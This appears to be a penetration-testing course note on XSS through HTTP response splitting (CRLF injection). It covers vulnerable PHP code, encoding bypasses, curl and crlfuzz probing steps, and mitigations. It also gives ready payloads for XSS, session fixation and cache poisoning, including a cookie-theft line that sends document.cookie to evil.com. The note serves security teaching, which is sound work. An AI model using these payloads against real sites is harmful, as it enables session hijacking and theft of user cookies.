---
tags: [vapt, xss, advanced]
difficulty: advanced
module: "07 - XSS"
topic: "07.13 XSS via HTTP Response Splitting"
---

# 07.13 — XSS via HTTP Response Splitting

## What is HTTP Response Splitting?

HTTP Response Splitting (CRLF Injection) occurs when user input is reflected into HTTP response headers without filtering `\r\n` (carriage return + line feed). Since HTTP uses CRLF to separate headers and delimit the response body, injecting CRLF lets an attacker inject fake headers — or even a second fake HTTP response.

```
HTTP RESPONSE STRUCTURE:
  HTTP/1.1 200 OK\r\n
  Content-Type: text/html\r\n
  Set-Cookie: session=abc\r\n
  \r\n                          ← blank line (CRLF) = end of headers!
  <html>body here</html>

CRLF INJECTION:
  If user input goes into a header:
  Location: /page?id=USER_INPUT
  
  INJECT: %0d%0a (URL-encoded CRLF)
  
  INPUT: /page?id=test%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
  
  RESULT:
  Location: /page?id=test\r\n
  Content-Type: text/html\r\n
  \r\n
  <script>alert(1)</script>
  
  → Browser sees this as a valid response body containing <script>!
  → XSS fires!
```

---

## CRLF Characters

```
\r = Carriage Return = 0x0D = %0d = %0D
\n = Line Feed       = 0x0A = %0a = %0A
\r\n = CRLF (end of header line in HTTP)

URL ENCODING:
  %0d%0a  = \r\n (URL-encoded CRLF)
  %0d     = \r   (carriage return only)
  %0a     = \n   (line feed only)
  
  DOUBLE ENCODING (bypass):
  %250d%250a  (percent-encode the %)
  %0d%0a%0d%0a = double CRLF (end headers, start body)
```

---

## Attack Scenarios

### Scenario 1: Header Injection via Redirect Parameter

```
VULNERABLE CODE (PHP):
  $location = $_GET['redirect'];
  header("Location: " . $location);
  
ATTACK:
  GET /redirect?redirect=https://target.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
  
RESULTING RESPONSE:
  HTTP/1.1 302 Found
  Location: https://target.com
  Content-Type: text/html
  
  <script>alert(1)</script>
  
→ Browser processes the injected body → XSS!
```

### Scenario 2: Cookie Injection

```
VULNERABLE CODE:
  header("Set-Cookie: lang=" . $_GET['lang']);

ATTACK:
  GET /setlang?lang=en%0d%0aSet-Cookie:%20session=attacker_session

RESULTING RESPONSE HEADERS:
  Set-Cookie: lang=en
  Set-Cookie: session=attacker_session    ← INJECTED!
  
→ Session fixation attack! Victim gets attacker's session ID!
```

### Scenario 3: XSS via Log Poisoning + Response Splitting

```
ATTACK CHAIN:
  1. Inject CRLF into User-Agent header:
     User-Agent: Mozilla%0d%0aContent-Type: text/html%0d%0a%0d%0a<script>alert(1)</script>
  
  2. If server logs this and later serves the log via web interface:
     → Admin viewing logs → XSS fires in admin's browser!
```

---

## Full Response Splitting (HTTP Splitting)

With CRLF injection, an attacker can inject a complete second response:

```
INJECT:
  /page?id=test%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><body><script>alert(1)</script></body></html>

RESULTING RESPONSE:
  HTTP/1.1 302 Found
  Location: /page?id=test
  
                              ← blank line ends original headers
  HTTP/1.1 200 OK             ← SECOND RESPONSE STARTS HERE!
  Content-Type: text/html
  
  <html><body><script>alert(1)</script></body></html>

WHY THIS MATTERS:
  In HTTP/1.0 with persistent connections or HTTP pipelining,
  the second response could be matched to a different request!
  → Cache poisoning — next user gets the attacker's content!
  → Modern HTTP/2 uses binary framing, mitigating this
  → HTTP/1.1 with pipelining still vulnerable in some configurations
```

---

## Finding CRLF Injection / Response Splitting

```bash
# STEP 1: FIND PARAMETERS REFLECTED IN RESPONSE HEADERS:
# Test any parameter that redirects or sets headers

# STEP 2: INJECT CRLF TEST CANARY:
curl -v "https://target.com/redirect?url=https://target.com%0d%0aX-Injected: test123"
# Look in response headers: X-Injected: test123 → VULNERABLE!

# STEP 3: TEST FOR VARIOUS ENCODINGS:
# Basic:        %0d%0a
# Linux newline: %0a only (some apps only strip \r)
# Double encode: %250d%250a
# Unicode:       %u000d%u000a (some parsers)

# STEP 4: AUTOMATED SCAN WITH CRLFUZZ:
crlfuzz -u "https://target.com/redirect?url=FUZZ" -c
# crlfuzz is a dedicated CRLF injection scanner

# STEP 5: MANUAL WITH BURP:
# Send request to Repeater
# Add %0d%0a after parameter value
# Check Response > Headers tab
```

---

## XSS Payload via CRLF

```
FULL XSS PAYLOAD:
  GET /redirect?url=https://target.com%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>

COOKIE THEFT PAYLOAD:
  GET /redirect?url=x%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>document.location='https://evil.com/steal?c='+document.cookie</script>

SESSION FIXATION PAYLOAD:
  GET /setlang?lang=en%0d%0aSet-Cookie:%20sessionid=ATTACKER_CHOSEN_SESSION_ID;%20Path=/;%20HttpOnly

CACHE POISONING:
  GET /page%0d%0aX-Cache-Poison:%20true

  → Some cache servers normalize URLs and cache the response
  → Next legitimate request for /page gets attacker's injected headers!
```

---

## Testing Headers That Accept User Input

```
COMMON HEADERS POPULATED FROM USER INPUT:
  Location: (redirect)
  Set-Cookie: (language/preference)
  Content-Disposition: (file download name)
  X-Forwarded-For: (if reflected in response)
  Access-Control-Allow-Origin: (if dynamic CORS)
  
  TEST EACH WITH:
  %0d%0aX-Test: injected
  
  IF X-Test: injected APPEARS IN RESPONSE HEADERS → VULNERABLE!
```

---

## Modern Mitigations

```
WHY LESS COMMON TODAY:
  1. Modern web frameworks strip \r\n from header values
     (Django, Rails, Express, Laravel — all do this)
  2. HTTP/2 uses binary framing — no CRLF splitting possible
  3. Reverse proxies (nginx, Apache) sanitize headers
  
STILL RELEVANT:
  → Legacy applications
  → Custom HTTP servers
  → Some edge cases in header forwarding
  → IoT/embedded devices
  → Non-standard frameworks

HOW TO FIX:
  1. Strip or reject \r and \n from ALL header values
  2. Use framework-provided response APIs (don't build raw HTTP)
  3. Whitelist allowed characters in redirect URLs
  4. Use CSP to limit script execution even if CRLF succeeds
```

---

## Related Notes
- [[02 - Reflected XSS]] — XSS via response body
- [[Module 17 - HTTP Request Smuggling]] — HTTP-level attacks
- [[14 - XSS Filter Bypass Techniques]] — filter bypass
- [[Module 09 - CSRF]] — session fixation context
